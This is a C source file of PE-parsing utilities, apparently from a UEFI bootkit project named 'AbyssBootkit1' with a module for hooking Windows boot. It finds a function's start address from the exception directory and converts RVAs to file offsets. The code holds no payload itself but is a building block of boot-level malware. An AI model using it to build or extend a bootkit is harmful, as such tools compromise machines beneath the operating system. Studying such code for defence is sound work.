// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Utils Address
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils00Debug.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures01PortableExecutable.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Searches for the start address of a function.
	@details        This function searches for the start address of a function within a PE image, identified by its ImageBase and NT Headers. It starts the search from the given AddressInFunction, which is typically an address within the function. The function uses information from the image's NT Headers to locate the function's start address and returns it as a pointer.


	@param[in]      ImageBase                   The base address of the PE image.
	@param[in]      NtHeaders                   A pointer to the NT Headers of the PE image.
	@param[in]      AddressInFunction           An address within the function for which the start address is sought.


	@retval         UINT8*                      Returns a pointer to the start address of the function, or NULL if the function start address could not be determined.
**/
UINT8*
BootWindowsHookings_UtilsAddress_FindStartAddress(
	IN              CONST UINT8*                ImageBase,
	IN              PEFI_IMAGE_NT_HEADERS       NtHeaders,
	IN              CONST UINT8*                AddressInFunction
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if AddressInFunction pointer is null
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Hello\r\n");

	// Failed
	if (AddressInFunction == NULL)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Check [Check if AddressInFunction pointer is null].\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the image has exception data directory
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Check if the image has exception data directory\r\n");

	// Failed
	if (NtHeaders->OptionalHeader.NumberOfRvaAndSizes <= EFI_IMAGE_DIRECTORY_ENTRY_EXCEPTION)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Check [Check if the image has exception data directory].\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get function table size
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Get function table size\r\n");

	CONST UINT32 FunctionTableSize = NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if function table size is zero
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Check if function table size is zero\r\n");

	// Failed
	if (FunctionTableSize == 0)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Check [Check if function table size is zero].\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get function table
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Get function table\r\n");

	CONST PIMAGE_RUNTIME_FUNCTION_ENTRY FunctionTable = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ImageBase + NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);


	// ---------------------------------------------------------------------------------------------------------------------
	// Calculate relative address to perform binary search
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Calculate relative address to perform binary search\r\n");

	CONST UINT32 RelativeAddress = (UINT32)(AddressInFunction - ImageBase);
	PIMAGE_RUNTIME_FUNCTION_ENTRY FunctionEntry = NULL;
	INT32 Low = 0;
	INT32 High = (INT32)(FunctionTableSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1;


	// ---------------------------------------------------------------------------------------------------------------------
	// Find the function that contains the specified address
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Find the function that contains the specified address\r\n");

	// Loop
	while (High >= Low)
	{
		CONST INT32 Middle = (Low + High) >> 1;
		FunctionEntry = &FunctionTable[Middle];
		// Check if address is within current function entry's range
		if (RelativeAddress < FunctionEntry->BeginAddress)
		{
			High = Middle - 1;
		}
		else if (RelativeAddress >= FunctionEntry->EndAddress)
		{
			Low = Middle + 1;
		}
		else
		{
			break;
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Search valid function entry
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Search valid function entry\r\n");

	if (High >= Low)
	{
		// Function entry marked as indirect
		if ((FunctionEntry->u.UnwindData & RUNTIME_FUNCTION_INDIRECT) != 0)
		{
			FunctionEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(FunctionEntry->u.UnwindData + ImageBase - 1);
		}

		// Match found
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Match found\r\n");

		// Retrieve the address where the function begins
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Retrieve the address where the function begins\r\n");

		return (UINT8*)ImageBase + FunctionEntry->BeginAddress;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Match not found
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELCRITICAL, L"[CRITICAL] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Match not found.\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (FindStartAddress) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return NULL;
}



/**
	@brief          Converts a Relative Virtual Address (RVA) to a file offset based on the provided NT headers.
	@details        This function takes the RVA and maps it to the corresponding file offset within the PE file. It iterates through the section headers to find the section that contains the RVA and calculates the corresponding file offset based on the RVA's location within that section.


	@param[in]      NtHeaders                   A pointer to the PE file's NT headers.
	@param[in]      Rva                         The Relative Virtual Address (RVA) to convert to a file offset.


	@retval         UINT32                      The file offset corresponding to the given RVA.
**/
UINT32
BootWindowsHookings_UtilsAddress_RelativeVirtualAddressToOffset(
	IN              PEFI_IMAGE_NT_HEADERS       NtHeaders,
	IN              UINT32                      Rva
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (RelativeVirtualAddressToOffset) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	PEFI_IMAGE_SECTION_HEADER SectionHeaders = IMAGE_FIRST_SECTION(NtHeaders);
	CONST UINT16 NumberOfSections = NtHeaders->FileHeader.NumberOfSections;
	UINT32 Result = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Iterate through the section headers to find the section containing the RVA
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (RelativeVirtualAddressToOffset) - Iterate through the section headers to find the section containing the RVA\r\n");

	for (UINT16 i = 0; i < NumberOfSections; ++i)
	{
		if (SectionHeaders->VirtualAddress <= Rva && SectionHeaders->VirtualAddress + SectionHeaders->Misc.VirtualSize > Rva)
		{
			// Calculate file offset based on RVA's location within the section
			//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (RelativeVirtualAddressToOffset) - Calculate file offset based on RVA's location within the section\r\n");

			Result = Rva - SectionHeaders->VirtualAddress + SectionHeaders->PointerToRawData;
			break;
		}
		SectionHeaders++;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Address.c] (RelativeVirtualAddressToOffset) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return Result;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
